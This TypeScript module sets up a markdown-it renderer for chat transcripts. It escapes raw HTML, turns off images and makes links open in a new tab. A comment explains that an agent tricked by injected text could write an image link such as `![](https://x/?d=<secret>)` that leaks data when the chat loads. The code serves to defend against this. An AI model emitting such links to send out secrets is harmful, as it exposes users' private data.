import MarkdownIt from 'markdown-it'

// html:false escapes raw HTML, so a transcript can never put markup (or a script) on the page.
const md = new MarkdownIt({ html: false, linkify: true, breaks: true })
// No images: one would load from any address the moment the chat opens, so text an agent was tricked into writing
// (`![](https://x/?d=<secret>)`) could send data out without a click. The markdown shows as plain text instead.
md.disable('image')
const linkOpen = md.renderer.rules.link_open ?? ((tokens, i, opts, _env, self) => self.renderToken(tokens, i, opts))
// A link opens beside the app, not in place of it.
md.renderer.rules.link_open = (tokens, i, opts, env, self) => {
  tokens[i].attrSet('target', '_blank')
  tokens[i].attrSet('rel', 'noopener noreferrer')
  return linkOpen(tokens, i, opts, env, self)
}

export const renderMarkdown = (text: string): string => md.render(text)
